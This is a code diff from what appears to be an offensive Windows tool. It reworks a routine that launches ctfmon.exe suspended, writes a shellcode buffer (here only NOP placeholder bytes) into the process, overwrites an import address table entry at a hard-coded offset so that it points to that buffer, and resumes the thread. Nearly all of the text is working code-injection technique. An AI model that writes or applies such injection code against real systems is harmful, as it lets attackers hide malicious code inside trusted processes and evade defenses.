@@ -122,13 +122,25 @@ int wmain(const int argc, wchar_t** argv) {
 	}
 	Sleep(4000); // wait for shared memory to be ready
 	unsigned char shellcode[4096] = { 0x90, 0x90 }; // payload
-	system("ctfmon.exe");
+	success = CreateProcess(
+        L"C:\\Windows\\System32\\ctfmon.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED,
+        NULL, NULL, &si, &pi);
+    	if (!success) {
+        	printf("CreateProcess failed\n");
+        	return 1;
+    	}
 	int procID = get_process_id("ctfmon.exe");
 	uintptr_t me = GetBaseAddr("ctfmon.exe");
 	uintptr_t targetIATEntry = me + 0x21D0;
 	uintptr_t shellcodeAddr = AllocateMemory(procID, shellcode, sizeof(shellcode));
 	write_address((PVOID)targetIATEntry, (PVOID)shellcodeAddr, sizeof(shellcode), procID);
-	system("ctfmon.exe");
+	ResumeThread(pi.hThread); // Start thread again (proc) and get to our hook
+
+    	// Close handles
+    	CloseHandle(pi.hThread);
+    	CloseHandle(pi.hProcess);
 }
 
 
